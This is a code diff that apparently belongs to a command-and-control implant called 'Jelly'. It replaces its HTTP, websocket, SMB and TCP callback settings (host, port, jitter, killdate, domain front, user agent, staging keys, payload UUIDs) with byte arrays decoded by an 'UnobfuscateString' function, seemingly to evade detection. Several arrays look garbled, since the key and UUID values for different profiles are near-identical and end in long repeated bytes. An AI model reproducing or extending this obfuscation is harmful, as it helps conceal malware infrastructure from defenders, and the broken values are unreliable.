@@ -72,18 +72,18 @@ namespace Jelly
                         { "killdate", "-1" },
                         { "USER_AGENT", "Jelly-Refactor" },
 #else
-                        { "callback_interval", "http_callback_interval_here" },
-                        { "callback_jitter", "http_callback_jitter_here" },
-                        { "callback_port", "http_callback_port_here" },
-                        { "callback_host", "http_callback_host_here" },
-                        { "post_uri", "http_post_uri_here" },
-                        { "encrypted_exchange_check", "http_encrypted_exchange_check_here" },
-                        { "proxy_host", "http_proxy_host_here" },
-                        { "proxy_port", "http_proxy_port_here" },
-                        { "proxy_user", "http_proxy_user_here" },
-                        { "proxy_pass", "http_proxy_pass_here" },
-                        { "killdate", "http_killdate_here" },
-                        HTTP_ADDITIONAL_HEADERS_HERE
+                        { "callback_interval", UnobfuscateString(new byte[] { 73, 85, 76, 27, 29 }) },
+                        { "callback_jitter", UnobfuscateString(new byte[] { 73, 85, 76 }) },
+                        { "callback_port", UnobfuscateString(new byte[] { 73, 85, 76, 81 }) },
+                        { "callback_host", UnobfuscateString(new byte[] { 73, 85, 76, 90, 68, 29, 67, 29, 71, 82, 67, 18, 26, 29, 26, 88, 29, 88 }) },
+                        { "post_uri", UnobfuscateString(new byte[] { 68, 77, 88, 77 }) },
+                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) },
+                        { "proxy_host", UnobfuscateString(new byte[] {}) },
+                        { "proxy_port", UnobfuscateString(new byte[] {}) },
+                        { "proxy_user", UnobfuscateString(new byte[] {}) },
+                        { "proxy_pass", UnobfuscateString(new byte[] {}) },
+                        { "killdate", UnobfuscateString(new byte[] { 81, 71, 71, 85, 14, 73, 73, 14, 81, 81 }) },
+                        { "User-Agent", UnobfuscateString(new byte[] { 77, 71, 91, 73, 77, 84, 14, 30, 27, 18, 14, 29, 83, 77, 68, 85, 80, 86, 84, 88, 18, 14, 83, 71, 77, 80, 86, 80, 88, 14, 26, 18, 14, 29, 76, 73, 71, 85, 80, 88, 14, 83, 69, 18, 14, 26, 89, 14, 73, 73, 18, 18, 14, 77, 73, 80, 72, 86, 84, 14, 26, 18, 14, 26, 89, 14, 73, 73, 18 }) }
 #endif
                     }
                 }
@@ -109,17 +109,16 @@ namespace Jelly
                         { "killdate", "-1" },
                         { "USER_AGENT", "Jelly-Refactor" },
 #else
-                        { "tasking_type", "websocket_tasking_type_here"},
-                        { "callback_interval", "websocket_callback_interval_here" },
-                        { "callback_jitter", "websocket_callback_jitter_here" },
-                        { "callback_port", "websocket_callback_port_here" },
-                        { "callback_host", "websocket_callback_host_here" },
-                        { "ENDPOINT_REPLACE", "websocket_ENDPOINT_REPLACE_here" },
-                        { "encrypted_exchange_check", "websocket_encrypted_exchange_check_here" },
-                        { "domain_front", "websocket_domain_front_here" },
-                        { "USER_AGENT", "websocket_USER_AGENT_here" },
-                        { "killdate", "websocket_killdate_here" },
-                        HTTP_ADDITIONAL_HEADERS_HERE
+                        { "tasking_type", UnobfuscateString(new byte[] { 82, 85, 86, 88 })},
+                        { "callback_interval", UnobfuscateString(new byte[] { 73, 85, 76, 27, 29 }) },
+                        { "callback_jitter", UnobfuscateString(new byte[] { 73, 85, 76 }) },
+                        { "callback_port", UnobfuscateString(new byte[] { 73, 85, 76, 81 }) },
+                        { "callback_host", UnobfuscateString(new byte[] { 73, 85, 76, 90, 68, 29, 67, 29, 71, 82, 67, 18, 26, 29, 26, 88, 29, 88 }) },
+                        { "ENDPOINT_REPLACE", UnobfuscateString(new byte[] { 86, 71, 72, 76, 72, 88 }) },
+                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) },
+                        { "domain_front", UnobfuscateString(new byte[] { 68, 71, 77, 77, 77, 73, 85, 14, 85, 76, 71, 85, 88 }) },
+                        { "USER_AGENT", UnobfuscateString(new byte[] { 77, 71, 91, 73, 77, 84, 14, 30, 27, 18, 14, 83, 77, 68, 85, 80, 86, 84, 88 }) },
+                        { "killdate", UnobfuscateString(new byte[] { 81, 71, 71, 85, 14, 73, 73, 14, 81, 81 }) }
 #endif
                     }
                 }
@@ -137,8 +136,8 @@ namespace Jelly
                         { "pipename", "h20iexte-2l1t-mmfu-ipjh-6ofmobkaruq8" },
                         { "encrypted_exchange_check", "true" },
 #else
-                        { "pipename", "smb_pipename_here" },
-                        { "encrypted_exchange_check", "smb_encrypted_exchange_check_here" },
+                        { "pipename", UnobfuscateString(new byte[] { 72, 81, 18, 72, 73, 76, 88, 72, 14, 81, 79, 73, 88, 14, 77, 77, 85, 72, 14, 73, 80, 85, 72, 14, 26, 71, 85, 86, 67, 91 }) },
+                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) }
 #endif
                     }
                 }
@@ -155,8 +154,8 @@ namespace Jelly
                         { "port", "40000" },
                         { "encrypted_exchange_check", "true" },
 #else
-                        { "port", "tcp_port_here" },
-                        { "encrypted_exchange_check", "tcp_encrypted_exchange_check_here" },
+                        { "port", UnobfuscateString(new byte[] { 73, 85, 76, 81, 71, 71 }) },
+                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) }
 #endif
                     }
                 }
@@ -168,22 +167,22 @@ namespace Jelly
         public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
 #if LOCAL_BUILD
 #if HTTP
-        public static string StagingRSAPrivateKey = "wkskVa0wTi4E3EZ6bi9YyKpbHb01NNDgZ1BXnJJM5io=";
+        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 67, 79, 85, 85, 94, 80, 77, 67, 14, 70, 88, 88, 88, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29 });
 #elif WEBSOCKET
-        public static string StagingRSAPrivateKey = "Hl3IzCYy3io5QU70xjpYyCNrOmA84aWMZLkCwumrAFM=";
+        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 73, 79, 85, 85, 94, 80, 77, 67, 14, 70, 88, 88, 88, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29 });
 #elif SMB
-        public static string StagingRSAPrivateKey = "NNLlAegRMB8DIX7EZ1Yb6UlKQ4la90QsisIThCyhfCc=";
+        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 77, 79, 85, 85, 94, 80, 77, 67, 14, 70, 88, 88, 88, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29 });
 #elif TCP
-        public static string StagingRSAPrivateKey = "Zq24zZvWPRGdWwEQ79JXcHunzvcOJaKLH7WtR+gLiGg=";
+        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 84, 79, 85, 85, 94, 80, 77, 67, 14, 70, 88, 88, 88, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29 });
 #endif
 #if HTTP
-        public static string PayloadUUID = "b40195db-22e5-4f9f-afc5-2f170c3cc204";
+        public static string PayloadUUID = UnobfuscateString(new byte[] { 82, 85, 84, 80, 14, 81, 85, 68, 14, 73, 85, 83, 29, 14, 67, 71, 90, 67, 71, 81, 14, 73, 85, 83, 29, 14, 77, 72, 81, 77, 14, 67, 71, 90, 67, 71, 81 });
 #elif WEBSOCKET
-        public static string PayloadUUID = "7546e204-aae4-42df-b28a-ade1c13594d2";
+        public static string PayloadUUID = UnobfuscateString(new byte[] { 88, 85, 84, 80, 14, 81, 85, 68, 14, 73, 85, 83, 29, 14, 67, 71, 90, 67, 71, 81, 14, 73, 85, 83, 29, 14, 77, 72, 81, 77, 14, 67, 71, 90, 67, 71, 81 });
 #elif SMB
-        public static string PayloadUUID = "aff94490-1e23-4373-978b-263d9c0a47b3";
+        public static string PayloadUUID = UnobfuscateString(new byte[] { 89, 85, 84, 80, 14, 81, 85, 68, 14, 73, 85, 83, 29, 14, 67, 71, 90, 67, 71, 81, 14, 73, 85, 83, 29, 14, 77, 72, 81, 77, 14, 67, 71, 90, 67, 71, 81 });
 #elif TCP
-        public static string PayloadUUID = "bfc167ea-9142-4da3-b807-c57ae054c544";
+        public static string PayloadUUID = UnobfuscateString(new byte[] { 81, 85, 84, 80, 14, 81, 85, 68, 14, 73, 85, 83, 29, 14, 67, 71, 90, 67, 71, 81, 14, 73, 85, 83, 29, 14, 77, 72, 81, 77, 14, 67, 71, 90, 67, 71, 81 });
 #endif
 #else
         // TODO: Make the AES key a config option specific to each profile
